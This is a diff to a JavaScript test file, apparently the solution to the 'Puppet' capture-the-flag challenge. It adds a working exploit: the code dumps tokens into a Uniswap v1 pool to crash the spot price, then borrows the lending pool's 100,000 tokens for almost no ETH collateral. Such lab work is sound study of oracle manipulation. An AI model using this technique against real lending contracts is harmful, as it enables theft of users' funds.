@@ -102,7 +102,21 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+         /** CODE YOUR EXPLOIT HERE */
+        // Reference : https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy
+
+        
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther("990"));
+
+        
+        await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(ethers.utils.parseEther("990"), ethers.utils.parseEther("1"), (await ethers.provider.getBlock('latest')).timestamp * 2, attacker.address);
+
+        let priceOracle = ethers.BigNumber.from(await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther("1")));
+        let numOfEths = priceOracle.mul(100000).add(1);
+        
+        await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther("100000"), {value: numOfEths});
+        
+        
     });
 
     after(async function () {
